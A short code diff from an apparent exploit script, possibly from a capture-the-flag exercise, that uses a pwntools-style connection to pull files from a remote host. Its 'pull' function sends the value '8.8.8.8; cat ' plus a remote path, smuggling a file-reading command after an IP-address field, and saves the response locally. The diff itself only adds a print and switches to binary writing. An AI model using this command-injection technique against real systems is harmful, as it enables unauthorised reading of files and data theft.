@@ -53,7 +53,8 @@ def pull(cmd):
     to_send = "8.8.8.8; cat " + rem
     r.sendline(to_send)
     resp = r.recvall()[300:]
-    with open(local, 'w+') as localfile:
+    print(resp)
+    with open(local, 'wb+') as localfile:
         localfile.write(resp)
 
 
